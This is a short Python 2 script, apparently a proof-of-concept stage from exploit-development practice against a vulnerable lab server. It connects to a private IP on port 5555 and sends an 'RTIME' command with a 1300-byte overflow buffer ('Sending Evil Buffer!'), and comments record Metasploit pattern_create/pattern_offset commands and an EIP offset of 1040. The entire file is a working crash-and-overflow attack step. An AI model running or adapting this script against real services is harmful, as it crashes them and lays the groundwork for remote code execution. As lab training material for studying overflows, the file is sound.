#!/usr/bin/python
import time, struct, sys
import socket



#req1 = "AUTH " + "\x41"*1072


#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1100 > pattern.txt
#/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP Register # here>

#offset was actually 1040 so we will prove this in the next vulnserverPOC4

cmd = "RTIME "

buffer = "A" * 1300



print "Sending Evil Buffer!"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('10.11.4.94', 5555))
s.recv(1024)
s.send(cmd+buffer)
s.close()
